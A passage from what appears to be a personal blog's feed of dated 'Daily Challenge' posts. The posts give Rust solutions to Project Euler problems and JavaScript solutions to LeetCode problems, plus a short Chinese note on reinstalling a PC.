in class MagicDictionary, as static/class variables are persisted across multiple test cases. Please see here for more details. SolutionNothing to say. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * Initialize your data structure here. */var MagicDictionary = function() &#123; if (this.set) this.set.clear(); else this.set = new Set();&#125;;/** * Build a dictionary through a list of words * @param &#123;string[]&#125; dict * @return &#123;void&#125; */MagicDictionary.prototype.buildDict = function(dict) &#123; for (const w of dict) &#123; this.set.add(w); &#125;&#125;;/** * Returns if there is any word in the trie that equals to the given word after modifying exactly one character * @param &#123;string&#125; word * @return &#123;boolean&#125; */MagicDictionary.prototype.search = function(word) &#123; const isOK = (w1, w2) =&gt; &#123; if (w1.length !== w2.length) return false; let cnt = 0; for (let i = 0; i &lt; w1.length; ++i) &#123; if (w1.charAt(i) !== w2.charAt(i)) ++cnt; &#125; return cnt === 1; &#125;; for (const w of this.set) &#123; if (w.length === word.length &amp;&amp; isOK(w, word)) return true; &#125; return false;&#125;;/** * Your MagicDictionary object will be instantiated and called as such: * var obj = Object.create(MagicDictionary).createNew() * obj.buildDict(dict) * var param_2 = obj.search(word) */]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-27 Daily Challenge]]></title>
    <url>%2F2019-01-27-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Pandigital multiples in Rust and K-th Symbol in Grammar in JavaScript. MathProblemPandigital multiplesProblem 38Take the number 192 and multiply it by each of 1, 2, and 3: 192 × 1 = 192192 × 2 = 384192 × 3 = 576 By concatenating each product we get the 1 to 9 pandigital, 192384576. We will call 192384576 the concatenated product of 192 and (1,2,3) The same can be achieved by starting with 9 and multiplying by 1, 2, 3, 4, and 5, giving the pandigital, 918273645, which is the concatenated product of 9 and (1,2,3,4,5). What is the largest 1 to 9 pandigital 9-digit number that can be formed as the concatenated product of an integer with (1,2, ... , n) where n &gt; 1? SolutionNothing to say. Implementation123456789101112131415161718192021222324252627282930313233343536fn main() &#123; let mut ans = 918273645; for i in 1..10000 &#123; let mut tmp: String = String::new(); let mut j = 1; while tmp.len() &lt; 9 &#123; tmp = format!("&#123;&#125;&#123;&#125;", tmp, i*j); j += 1; &#125; if tmp.len() != 9 &#123; continue; &#125; let tmp_n = tmp.parse::&lt;i32&gt;().unwrap(); if tmp_n &gt; ans &amp;&amp; is_pandigital(&amp;tmp) &#123; ans = tmp_n; println!("&#123;&#125;, &#123;&#125;", i, tmp); &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn is_pandigital(s: &amp;String) -&gt; bool &#123; static NUMS: [char; 9] = ['1', '2', '3', '4', '5', '6', '7', '8', '9']; for c in &amp;NUMS &#123; let mut cnt = 0; for i in s.chars() &#123; if i == *c &#123; cnt += 1; &#125; &#125; if cnt != 1 &#123; return false; &#125; &#125; return true;&#125; AlgorithmProblem779. K-th Symbol in GrammarOn the first row, we write a 0. Now in every subsequent row, we look at the previous row and replace each occurrence of 0 with 01, and each occurrence of 1 with 10. Given row N and index K, return the K-th indexed symbol in row N. (The values of K are 1-indexed.) (1 indexed). 123456789101112131415161718Examples:Input: N = 1, K = 1Output: 0Input: N = 2, K = 1Output: 0Input: N = 2, K = 2Output: 1Input: N = 4, K = 5Output: 1Explanation:row 1: 0row 2: 01row 3: 0110row 4: 01101001 Note: N will be an integer in the range [1, 30]. K will be an integer in the range [1, 2^(N-1)]. SolutionIt&#39;s easy to find that string is self-expanded. What&#39;s added after N+1 is replace what N have more than N-1. For example, row 3 = 0110, add &quot;10&quot; to end of row 2, and &quot;10&quot; is what &quot;1&quot; replaced by. When we want what&#39;s on index $K​$, we just need to know $\lfloor \frac{K}{2}\rfloor​$. And what&#39;s more? We would find that because &quot;0&quot; -&gt; &quot;01&quot;, &quot;1&quot; -&gt; &quot;10&quot;, 1^1 = 0, 0 ^ 1 = 1. So you would find that what&#39;s important is how many 1s in K&#39;s binary expression! Implementation12345678910111213141516171819/** * @param &#123;number&#125; N * @param &#123;number&#125; K * @return &#123;number&#125; */var kthGrammar = function(N, K) &#123; return bitCount(K-1) &amp; 1;&#125;;function bitCount (n) &#123; n = n - ((n &gt;&gt; 1) &amp; 0x55555555); n = (n &amp; 0x33333333) + ((n &gt;&gt; 2) &amp; 0x33333333); return ((n + (n &gt;&gt; 4) &amp; 0xF0F0F0F) * 0x1010101) &gt;&gt; 24;&#125;// console.log(kthGrammar(1, 1));// console.log(kthGrammar(2, 1));// console.log(kthGrammar(2, 2));// console.log(kthGrammar(4, 5));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-26 Daily Challenge]]></title>
    <url>%2F2019-01-26-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Truncatable primes in Rust and Student Attendance Record II in JavaScript. MathProblemTruncatable primesProblem 37The number 3797 has an interesting property. Being prime itself, it is possible to continuously remove digits from left to right, and remain prime at each stage: 3797, 797, 97, and 7. Similarly we can work from right to left: 3797, 379, 37, and 3. Find the sum of the only eleven primes that are both truncatable from left to right and right to left. NOTE: 2, 3, 5, and 7 are not considered to be truncatable primes. SolutionNothing to say. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445extern crate primal;use primal::Sieve;fn main() &#123; const LIMIT: usize = 1_000_000_000; let sieve: Sieve = Sieve::new(LIMIT); let mut ans = 0; let mut cnt = 0; let mut i = 1; while cnt &lt; 11 &#123; let tmp = sieve.nth_prime(i); if is_truncatable(tmp, &amp;sieve) &#123; ans += tmp; cnt += 1; println!("&#123;&#125;", tmp) &#125; i += 1; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn is_truncatable(n: usize, sieve: &amp;Sieve) -&gt; bool &#123; let l = n.to_string().len(); if l == 1 &#123; return false; &#125; let mut base = 10usize.pow(l as u32 - 1); while base != 1 &#123; // println!("&#123;&#125;",n%base); if !sieve.is_prime(n % base) &#123; return false &#125; base /= 10; &#125; let mut n = n; while n != 0 &#123; // println!("&#123;&#125;",n); if !sieve.is_prime(n) &#123; return false; &#125; n /= 10; &#125; true&#125; AlgorithmProblem552. Student Attendance Record IIGiven a positive integer n, return the number of all possible attendance records with length n, which will be regarded as rewardable. The answer may be very large, return it after mod 109 + 7. A student attendance record is a string that only contains the following three characters: &#39;A&#39; : Absent. &#39;L&#39; : Late. &#39;P&#39; : Present. A record is regarded as rewardable if it doesn&#39;t contain more than one &#39;A&#39; (absent) or more than two continuous &#39;L&#39; (late). Example 1: 123456Input: n = 2Output: 8 Explanation:There are 8 records with length 2 will be regarded as rewardable:&quot;PP&quot; , &quot;AP&quot;, &quot;PA&quot;, &quot;LP&quot;, &quot;PL&quot;, &quot;AL&quot;, &quot;LA&quot;, &quot;LL&quot;Only &quot;AA&quot; won&apos;t be regarded as rewardable owing to more than one absent times. Note: The value of n won&#39;t exceed 100,000. SolutionThere is a DP problem. Let set a array $DP[n][6]$，where： $$DP[n][0]$$ means no Absent and no Late at last of record, $$DP[n][1]$$ means no Absent and one Late at last of record, $$DP[n][2]$$ means no Absent and two Late at last of record, $$DP[n][3]$$ means one Absent and no Late at last of record, $$DP[n][4]$$ means one Absent and one at last of record, $$DP[n][5]$$ means one Absent and two at last of record, so, $$DP[i][0] = \left{\begin{matrix} 1,i=1\\sum_{j=0}^2DP[i-1][j],i&gt;1\end{matrix}\right.​$$ $$DP[i][1] = \left{\begin{matrix} 1,i=1\DP[i-1][0],i&gt;1\end{matrix}\right.​$$ $$DP[i][2] = \left{\begin{matrix} 1,i=1\DP[i-1][1],i&gt;1\end{matrix}\right.​$$ $$DP[i][3] = \left{\begin{matrix} 1,i=1\\sum_{j=0}^5DP[i-1][j],i&gt;1\end{matrix}\right.$$ $$DP[i][4] = \left{\begin{matrix} 1,i=1\DP[i-1][3],i&gt;1\end{matrix}\right.$$ $$DP[i][5] = \left{\begin{matrix} 1,i=1\DP[i-1][4],i&gt;1\end{matrix}\right.​$$ Implementation1234567891011121314151617181920212223242526272829/** * @param &#123;number&#125; n * @return &#123;number&#125; */var checkRecord = function(n) &#123; const MOD = 1000000007; let dp = []; dp.push([1, 1, 0, 1, 0, 0]); dp.push([0, 0, 0, 0, 0, 0]); for (let i = 1; i &lt; n; ++i) &#123; dp[i &amp; 1][0] = (dp[(~i) &amp; 1][0] + dp[(~i) &amp; 1][1]) % MOD; dp[i &amp; 1][0] = (dp[i &amp; 1][0] + dp[(~i) &amp; 1][2]) % MOD; dp[i &amp; 1][1] = dp[(~i) &amp; 1][0]; dp[i &amp; 1][2] = dp[(~i) &amp; 1][1]; dp[i &amp; 1][3] = 0; for (let j = 0; j &lt; 6; ++j) &#123; dp[i &amp; 1][3] += dp[(~i) &amp; 1][j]; dp[i &amp; 1][3] %= MOD; &#125; dp[i &amp; 1][4] = dp[(~i) &amp; 1][3]; dp[i &amp; 1][5] = dp[(~i) &amp; 1][4]; &#125; let ans = 0; for (let i = 0; i &lt; 6; ++i) &#123; ans += dp[(~n) &amp; 1][i]; ans %= MOD; &#125; return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-25 Daily Challenge]]></title>
    <url>%2F2019-01-25-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Double-base palindromes in Rust and Find Mode in Binary Search Tree in JavaScript. MathProblemDouble-base palindromesProblem 36The decimal number, 585 = 10010010012 (binary), is palindromic in both bases. Find the sum of all numbers, less than one million, which are palindromic in base 10 and base 2. (Please note that the palindromic number, in either base, may not include leading zeros.) SolutionIn fact I&#39;ve done something similar before, at 2018-12-25 Daily Challenge. There is quick way to find palindromes, but rewrite it in rust is a suffer. So I use brute force, which makes me happier :D Implementation12345678910111213141516171819202122232425262728293031fn main() &#123; const LIMIT: usize = 1_000_000; let mut ans: usize = 0; for i in 1..LIMIT &#123; if double_base_palindrome(i) &#123; println!("&#123;&#125;, &#123;&#125;", i, format!("&#123;:b&#125;", i)); ans += i; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn double_base_palindrome(n: usize) -&gt; bool &#123; let s = n.to_string(); // println!("&#123;&#125;",s); let s = s.as_bytes(); for i in 0..(s.len()/2) &#123; if s[i] != s[s.len()-1-i] &#123; return false; &#125; &#125; let s = format!("&#123;:b&#125;", n); // println!("&#123;&#125;",s); let s = s.as_bytes(); for i in 0..(s.len()/2) &#123; if s[i] != s[s.len()-1-i] &#123; return false; &#125; &#125; true&#125; AlgorithmProblem501. Find Mode in Binary Search TreeGiven a binary search tree (BST) with duplicates, find all the mode(s)) (the most frequently occurred element) in the given BST. Assume a BST is defined as follows: The left subtree of a node contains only nodes with keys less than or equal to the node&#39;s key. The right subtree of a node contains only nodes with keys greater than or equal to the node&#39;s key. Both the left and right subtrees must also be binary search trees. For example:Given BST [1,null,2,2], 123451 \ 2 /2 return [2]. Note: If a tree has more than one mode, you can return them in any order. Follow up: Could you do that without using any extra space? (Assume that the implicit stack space incurred due to recursion does not count). SolutionFirst I solve it by using a set, then rewrite it with another approach with less space usage. Because problem is easy, so I don&#39;t want to explain my solution, check the code~:D Implementation12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number[]&#125; */var findMode = function(root) &#123; let map = new Map(); let ans = []; const travel = (root) =&gt; &#123; if (!root) return; if (map.has(root.val)) map.set(root.val, map.get(root.val) + 1); else map.set(root.val, 1); travel(root.left); travel(root.right); &#125;; travel(root); let mx = 0; for (const [_key, value] of map.entries()) &#123; mx = mx &lt; value? value: mx; &#125; for (const [key, value] of map.entries()) &#123; if (value === mx) ans.push(key); &#125; return ans;&#125;; 123456789101112131415161718192021222324252627282930313233/** * @param &#123;TreeNode&#125; root * @return &#123;number[]&#125; */var findMode = function(root) &#123; let ans = []; let cnt = 0; let mxcnt = 0; let cur = null; const inorder_travel = (root) =&gt; &#123; if (!root) return; inorder_travel(root.left); handle_val(root.val); inorder_travel(root.right); &#125;; const handle_val = (val) =&gt; &#123; if (val !== cur) &#123; cur = val; cnt = 1; &#125; else &#123; cnt += 1; &#125; if (cnt &gt; mxcnt) &#123; ans.splice(0, ans.length); ans.push(val); mxcnt = cnt; &#125; else if (cnt === mxcnt) &#123; ans.push(val); &#125; &#125;; inorder_travel(root); return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-24 Daily Challenge]]></title>
    <url>%2F2019-01-24-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Circular primes in Rust and Super Ugly Number in JavaScript. MathProblemCircular primesProblem 35The number, 197, is called a circular prime because all rotations of the digits: 197, 971, and 719, are themselves prime. There are thirteen such primes below 100: 2, 3, 5, 7, 11, 13, 17, 31, 37, 71, 73, 79, and 97. How many circular primes are there below one million? SolutionNothing to say. Implementation123456789101112131415161718192021222324252627282930extern crate primal;use primal::Sieve;use std::string::ToString;fn main() &#123; const LIMIT: usize = 1_000_000; let sieve: Sieve = Sieve::new(LIMIT); let count = sieve.prime_pi(LIMIT) + 1usize; let mut ans = 0; for i in 1..count &#123; let mut num = sieve.nth_prime(i); let l = num.to_string().len(); let base = 10usize.pow(l as u32 - 1); // println!("&#123;&#125;,&#123;&#125;",num,base); let mut is_ok = true; for _i in 1..l &#123; num = num / base + num % base * 10; // println!("&#123;&#125;",num); if !sieve.is_prime(num) &#123; is_ok = false; break; &#125; &#125; if is_ok &#123; ans += 1; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem313. Super Ugly NumberMedium Write a program to find the nth super ugly number. Super ugly numbers are positive numbers whose all prime factors are in the given prime list primes of size k. Example: 1234Input: n = 12, primes = [2,7,13,19]Output: 32 Explanation: [1,2,4,7,8,13,14,16,19,26,28,32] is the sequence of the first 12 super ugly numbers given primes = [2,7,13,19] of size 4. Note: 1 is a super ugly number for any given primes. The given numbers in primes are in ascending order. 0 &lt; k ≤ 100, 0 &lt; n ≤ 1e6, 0 &lt; primes[i] &lt; 1000. The nth super ugly number is guaranteed to fit in a 32-bit signed integer. SolutionOne way to solve it is priority queue, but ES6 doesn&#39;t have it. Another way is use a array to maintain every position which primes should multiply. Implementation1234567891011121314151617181920212223/** * @param &#123;number&#125; n * @param &#123;number[]&#125; primes * @return &#123;number&#125; */var nthSuperUglyNumber = function(n, primes) &#123; let pos = new Array(primes.length).fill(0); let ugly = [1]; for (let i = 1; i &lt; n; ++i) &#123; let mn = Number.MAX_SAFE_INTEGER; for (let j = 0; j &lt; primes.length; ++j) &#123; mn = Math.min(mn, primes[j] * ugly[pos[j]]); &#125; for (let j = 0; j &lt; primes.length; ++j)&#123; if (!(mn%primes[j])) ++pos[j]; &#125; ugly[i] = mn; &#125; return ugly[n-1];&#125;;// console.log(nthSuperUglyNumber(n = 12, primes = [2,7,13,19]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-23 Daily Challenge]]></title>
    <url>%2F2019-01-23-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Digit factorials in Rust and Search a 2D Matrix II in JavaScript. MathProblemDigit factorialsProblem 34145 is a curious number, as 1! + 4! + 5! = 1 + 24 + 120 = 145. Find the sum of all numbers which are equal to the sum of the factorial of their digits. Note: as 1! = 1 and 2! = 2 are not sums they are not included. SolutionSimple DFS is capabel for this problem. Because 9!*7 &lt; 9e7, so number limit will be 6. Implementation123456789101112131415161718192021222324252627282930313233343536373839use std::vec::Vec;fn main() &#123; let mut ans: Vec&lt;i64&gt; = Vec::new(); dfs(0, 6, 0, 0, &amp;mut ans); ans.sort(); ans.dedup(); let mut ans_sum = 0; for num in &amp;ans &#123; println!("&#123;&#125;", num); ans_sum += num; &#125; println!("Answer is &#123;&#125;", ans_sum);&#125;fn dfs(c: i64, n: i64, num: i64, sum: i64, ans: &amp;mut Vec&lt;i64&gt;)&#123; if sum == num &amp;&amp; sum &gt; 2 &#123; ans.push(num); &#125; if c &gt; n &#123; return; &#125; for i in 0i64..10i64 &#123; if num == 0 &amp;&amp; i == 0 &#123; continue; &#125; else &#123; dfs(c+1, n, num*10 + i, sum + factorial(i), ans); &#125; &#125;&#125;fn factorial(i: i64) -&gt; i64 &#123; let mut tmp = 1; for j in 1..(i+1) &#123; tmp *= j; &#125; tmp&#125; AlgorithmProblem240. Search a 2D Matrix IIWrite an efficient algorithm that searches for a value in an m x n matrix. This matrix has the following properties: Integers in each row are sorted in ascending from left to right. Integers in each column are sorted in ascending from top to bottom. Example: Consider the following matrix: 1234567[ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]] Given target = 5, return true. Given target = 20, return false. SolutionSimple simulation. Implementation1234567891011121314151617/** * @param &#123;number[][]&#125; matrix * @param &#123;number&#125; target * @return &#123;boolean&#125; */var searchMatrix = function(matrix, target) &#123; if(!matrix.length || !matrix[0].length || target &lt; matrix[0][0]) return false; let row = 0; let col = matrix[0].length - 1; let m = matrix.length; while (row &lt; m &amp;&amp; col &gt;= 0) &#123; if (target === matrix[row][col]) return true; else if (target &lt; matrix[row][col]) --col; else ++row; &#125; return false;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-22 Daily Challenge]]></title>
    <url>%2F2019-01-22-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Digit cancelling fractions in Rust and Repeated String Match in JavaScript. MathProblemDigit cancelling fractionsProblem 33The fraction 49/98 is a curious fraction, as an inexperienced mathematician in attempting to simplify it may incorrectly believe that 49/98 = 4/8, which is correct, is obtained by cancelling the 9s. We shall consider fractions like, 30/50 = 3/5, to be trivial examples. There are exactly four non-trivial examples of this type of fraction, less than one in value, and containing two digits in the numerator and denominator. If the product of these four fractions is given in its lowest common terms, find the value of the denominator. SolutionBrute force. Implementation1234567891011121314151617181920fn main() &#123; let mut numerator = 1; let mut denominator = 1; for i in 1..9 &#123; for j in i+1..10 &#123; for k in 1..10 &#123; if (i*10 + k)*j == (k*10 + j)*i &#123; println!("&#123;&#125;/&#123;&#125; = &#123;&#125;/&#123;&#125;",i*10+k,k*10+j,i,j); numerator *= i; denominator *= j; &#125; &#125; &#125; &#125; println!("Answer is &#123;&#125;", denominator/gcd(denominator, numerator));&#125;fn gcd(a: usize, b: usize) -&gt; usize &#123; return if b == 0 &#123; a &#125; else &#123; gcd(b, a%b) &#125;&#125; AlgorithmProblem686. Repeated String MatchGiven two strings A and B, find the minimum number of times A has to be repeated such that B is a substring of it. If no such solution, return -1. For example, with A = &quot;abcd&quot; and B = &quot;cdabcdab&quot;. Return 3, because by repeating A three times (“abcdabcdabcd”), B is a substring of it; and B is not a substring of A repeated two times (&quot;abcdabcd&quot;). Note:The length of A and B will be between 1 and 10000. SolutionNothing to say. Implementation123456789101112/** * @param &#123;string&#125; A * @param &#123;string&#125; B * @return &#123;number&#125; */var repeatedStringMatch = function(A, B) &#123; let nstr = A; while(nstr.length &lt; B.length) nstr += A; return nstr.indexOf(B) !== -1 ? Math.ceil(B.length/A.length):((nstr+A).indexOf(B) === -1? -1:Math.ceil(B.length/A.length)+1);&#125;;// console.log(repeatedStringMatch("abcd","cdabcdab"));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[又一次装机]]></title>
    <url>%2F%E5%8F%88%E4%B8%80%E6%AC%A1%E8%A3%85%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[更新了固态硬盘，所以又要重装电脑啦~记录一蛤装机过程，主要还是给自己以后参考用。 准备工作到Download Windows 10 Disc Image (ISO File) - Microsoft下载创建安装盘的工具 到电脑厂商官网/硬件厂商官网下载驱动。 使用GeekUninstaller导出一份软件清单，并且按照清单下载安装程序（假如没有留下来的）。 查看Path里有没有什么需要配置的东西，保留ssh私钥。 测试驱动包会干些什么（别再给我搞个什么电脑管家我就艹了） 代码、浏览器都不用备份，我使用OneDrive/Chrome解决迁移问题（同步真是好，但是涉密千万别上网）。 UWP应用虽好，但是不一定在清单里，记得备份一下列表。 有注册的软件记得注销/记录注册码。 单机游戏记得备份存档，云存档不用。各个工具的设置如果能导出的话导一下。 安装过程安装过程就是反着来就是了。 顺便一提这次加了内存换了SSD，国产软件基本都丢虚拟机里了。 目前来看暂时没有想到什么值得一提的东西，可能是因为比较习惯了吧。]]></content>
      <categories>
        <category>Notes</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019-01-21 Daily Challenge]]></title>
    <url>%2F2019-01-21-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Pandigital products in Rust and Candy in JavaScript. MathProblemPandigital productsProblem 32We shall say that an n-digit number is pandigital if it makes use of all the digits 1 to n exactly once; for example, the 5-digit number, 15234, is 1 through 5 pandigital. The product 7254 is unusual, as the identity, 39 × 186 = 7254, containing multiplicand, multiplier, and product is 1 through 9 pandigital. Find the sum of all products whose multiplicand/multiplier/product identity can be written as a 1 through 9 pandigital. HINT: Some products can be obtained in more than one way so be sure to only include it once in your sum. SolutionBecause there are nine digits, so multiplication will be $a\times bcde=fghi$ or $ab\times cde=fghi$. But apart from brute force approach, I can&#39;t find another solution. Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061use std::collections::HashSet;fn main() &#123; let mut set: HashSet&lt;i32&gt; = HashSet::new(); let mut ans = 0; for i in 1..10 &#123; for j in 1234..9877 &#123; if i*j &gt; 9999 &#123; break; &#125; if check(i, j, i*j) &#123; println!("&#123;&#125; * &#123;&#125; = &#123;&#125;", i, j, i*j); set.insert(i*j); &#125; &#125; &#125; for i in 12..99 &#123; for j in 123..988&#123; if i*j &gt; 9999 &#123; break; &#125; if check(i, j, i*j) &#123; println!("&#123;&#125; * &#123;&#125; = &#123;&#125;", i, j, i*j); set.insert(i*j); &#125; &#125; &#125; for num in set &#123; ans += num; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn check(mut multiplicand: i32, mut multiplier: i32, mut product: i32) -&gt; bool &#123; let mut ok: [bool; 10] = [false; 10]; while multiplicand &gt; 0 &#123; let tmp = multiplicand % 10; multiplicand /= 10; if tmp == 0 || ok[tmp as usize] &#123; return false; &#125; ok[tmp as usize] = true; &#125; while multiplier &gt; 0 &#123; let tmp = multiplier % 10; multiplier /= 10; if tmp == 0 || ok[tmp as usize] &#123; return false; &#125; ok[tmp as usize] = true; &#125; while product &gt; 0 &#123; let tmp = product % 10; product /= 10; if tmp == 0 || ok[tmp as usize] &#123; return false; &#125; ok[tmp as usize] = true; &#125; return true;&#125; AlgorithmProblem135. CandyThere are N children standing in a line. Each child is assigned a rating value. You are giving candies to these children subjected to the following requirements: Each child must have at least one candy. Children with a higher rating get more candies than their neighbors. What is the minimum candies you must give? Example 1: 123Input: [1,0,2]Output: 5Explanation: You can allocate to the first, second and third child with 2, 1, 2 candies respectively. Example 2: 1234Input: [1,2,2]Output: 4Explanation: You can allocate to the first, second and third child with 1, 2, 1 candies respectively. The third child gets 1 candy because it satisfies the above two conditions. SolutionIf ultimate answer is arr[n], consider one position k, arr[k] can only be arr[k-1] + 1, 1, or arr[k+1] + 1, which means all we need is scanning ratings from left, and scanning ratings from right. Implementation1234567891011121314151617181920212223/** * @param &#123;number[]&#125; ratings * @return &#123;number&#125; */var candy = function(ratings) &#123; let n = ratings.length; let ans = 0; let left = new Array(n); let right = new Array(n); left[0] = 1; right[n-1] = 1; for(let i = 1; i &lt; n; ++i)&#123; left[i] = ratings[i] &gt; ratings[i-1]? left[i-1] + 1: 1; right[n-1-i] = ratings[n-1-i] &gt; ratings[n-i]? right[n-i] + 1: 1; &#125; for(let i = 0; i &lt; n; ++i)&#123; ans += Math.max(left[i], right[i]); &#125; return ans;&#125;;// console.log(candy([1,0,2]));// console.log(candy([1,2,2]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-20 Daily Challenge]]></title>
    <url>%2F2019-01-20-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Digit fifth powers in Rust and Valid Square in JavaScript. MathProblemCoin sumsProblem 31In England the currency is made up of pound, £, and pence, p, and there are eight coins in general circulation: 1p, 2p, 5p, 10p, 20p, 50p, £1 (100p) and £2 (200p). It is possible to make £2 in the following way: 1×£1 + 1×50p + 2×20p + 1×5p + 1×2p + 3×1p How many different ways can £2 be made using any number of coins? SolutionUse DP to solve it. Implementation12345678910111213141516171819use std::vec::Vec;fn main() &#123; println!("Answer is &#123;&#125;", solve(200));&#125;fn solve(n: usize) -&gt; i32 &#123; let mut arr: Vec&lt;i32&gt; = vec![0; n + 1]; let coins: [usize; 8] = [1, 2, 5, 10, 20, 50, 100, 200]; arr[0] = 1; for coin in coins.iter() &#123; if *coin &lt;= n &#123; for i in *coin..(n+1) &#123; arr[i] += arr[i - coin]; &#125; &#125; &#125; return arr[n];&#125; AlgorithmProblem168. Excel Sheet Column TitleEasy Given a positive integer, return its corresponding column title as appear in an Excel sheet. For example: 123456781 -&gt; A2 -&gt; B3 -&gt; C...26 -&gt; Z27 -&gt; AA28 -&gt; AB ... Example 1: 12Input: 1Output: &quot;A&quot; Example 2: 12Input: 28Output: &quot;AB&quot; Example 3: 12Input: 701Output: &quot;ZY&quot; SolutionNothing to say. Implementation123456789101112131415161718192021/** * @param &#123;number&#125; n * @return &#123;string&#125; */var convertToTitle = function(n) &#123; n -= 1; let base = 26; let len = 1; let ans = ""; while(n &gt;= base)&#123; n -= base; len += 1; base *= 26; &#125; while(len)&#123; ans += String.fromCharCode(n%26+65); len -= 1; n = Math.floor(n/26); &#125; return ans.split('').reverse().join('');&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-19 Daily Challenge]]></title>
    <url>%2F2019-01-19-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Digit fifth powers in Rust and Valid Square in JavaScript. MathProblemDigit fifth powersProblem 30Surprisingly there are only three numbers that can be written as the sum of fourth powers of their digits: $1634 = 1^4 + 6^4 + 3^4 + 4^4$$8208 = 8^4 + 2^4 + 0^4 + 8^4$$9474 = 9^4 + 4^4 + 7^4 + 4^4$ As $1 = 1^4$ is not a sum it is not included. The sum of these numbers is 1634 + 8208 + 9474 = 19316. Find the sum of all the numbers that can be written as the sum of fifth powers of their digits. SolutionAll you need is a DFS. Because $9^5&lt;10^5$,$7\times 9^5&lt;10^6$, so upper bound of DFS is 6. Implementation123456789101112131415161718192021222324252627use std::vec::Vec;fn main() &#123; let mut ans: Vec&lt;i32&gt; = Vec::new(); dfs(0, 5, 0, 0, &amp;mut ans); ans.sort(); ans.dedup(); let mut ans_sum = 0; for num in &amp;ans &#123; println!("&#123;&#125;", num); ans_sum += num; &#125; println!("Answer is &#123;&#125;", ans_sum);&#125;fn dfs(c: i32, n: i32, num: i32, sum: i32, ans: &amp;mut Vec&lt;i32&gt;)&#123; if sum == num &amp;&amp; sum &gt; 1 &#123; ans.push(num); &#125; if c &gt; n &#123; return; &#125; for i in 0i32..10i32 &#123; dfs(c+1, n, num*10 + i, sum + i.pow(n as u32), ans); &#125;&#125; AlgorithmProblem593. Valid SquareMedium Given the coordinates of four points in 2D space, return whether the four points could construct a square. The coordinate (x,y) of a point is represented by an integer array with two integers. Example: 12Input: p1 = [0,0], p2 = [1,1], p3 = [1,0], p4 = [0,1]Output: True Note: All the input integers are in the range [-10000, 10000]. A valid square has four equal sides with positive length and four equal angles (90-degree angles). Input points have no order. SolutionHere&#39;s how I solve it: There is three line when you fixed one point, and pick up shorter two. Check if these two line are of same length and don&#39;t equal zero. Check if these two line are perpendicular. Implementation1234567891011121314151617181920212223242526/** * @param &#123;number[]&#125; p1 * @param &#123;number[]&#125; p2 * @param &#123;number[]&#125; p3 * @param &#123;number[]&#125; p4 * @return &#123;boolean&#125; */var validSquare = function(p1, p2, p3, p4) &#123; const dis = (p1, p2) =&gt; &#123; return Math.sqrt((p1[0]-p2[0])*(p1[0]-p2[0])+(p1[1]-p2[1])*(p1[1]-p2[1])); &#125;; const cmp = (a, b) =&gt; 